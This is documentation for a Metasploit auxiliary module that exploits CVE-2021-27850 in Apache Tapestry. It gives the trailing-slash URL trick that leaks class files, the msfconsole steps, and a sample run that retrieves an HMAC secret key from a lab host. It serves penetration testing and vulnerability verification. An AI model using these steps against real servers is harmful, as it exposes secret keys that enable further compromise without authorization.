## Description

This module exploits CVE-2021-27850 which affects several versions of Apache Tapestry. The versions concerned are at least 5.4.5, 5.5.0, 5.6.2 and 5.7.0. This CVE allows an attacker to leak the source code of a Tapestry server by requesting a particular `.class` file with its name through the url with an extra `/` at the end: http://tapestryhost:8080/assets/something/services/AppModule.class/. Due to this, it is possible to leak the HMAC secret key which is located in `AppModule.class` by default.

## Installation

A vulnerable version of Apache Tapestry can be downloaded from [here](https://downloads.apache.org/tapestry/apache-tapestry-5.7.0-bin.zip). I highly recommend you to follow the Tapestry tutorial [there](https://tapestry.apache.org/tapestry-tutorial.html). It will guide you through all the steps from setting up to launching a demo skeleton of your server.

## Verification Steps

List the steps needed to make sure this thing works

- 1. Start `msfconsole`
- 2. `use auxiliary/gather/cve_2021_27850_apache_tapestry_hmac_key`
- 3. `set RHOST <target_host>` and `set RPORT <target_port>`
- 4. `check` to check if the targeted Tapestry server is vulnerable or not
- 5. `set targeted_class` if you want to target another class than the default one (AppModule.class) 
- 6. `run` the module to exploit the CVE and leak the secret key !

## Options

**RHOSTS**

Set the target host.

**RPORT**

Set the target port. The default value is `8080` which is the default value used by Tapestry server.

**TARGETED_CLASS**

This is not a required option and by default the value is `AppModule.class` which is also the default java class of by Tapestry server where the hmac key is set. But in case you want to target a different java class, it can be done by setting this option with another class name.

## Scenarios

```
msf6 > use auxiliary/gather/cve_2021_27850_apache_tapestry_hmac_key
msf6 auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > set rhost 172.16.215.155rhost => 172.16.215.155
msf6 auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > set targeturi /hotels
targeturi => /hotels
msf6 auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > check

[+] Java file leak at 172.16.215.155:8080/hotels/assets/app/bf78ed9f/services/AppModule.class/
[+] 172.16.215.155:8080 - The target is vulnerable.
msf6 auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > run
[*] Running module against 172.16.215.155

[+] Apache Tapestry class file saved at /user/.msf4/loot/20210721173200_default_172.16.215.155_tapestry.AppModu_493080.bin.
[+] HMAC key found: 3e986070-b0d6-4634-93fe-4febebc90529.
[*] Auxiliary module execution completed
```
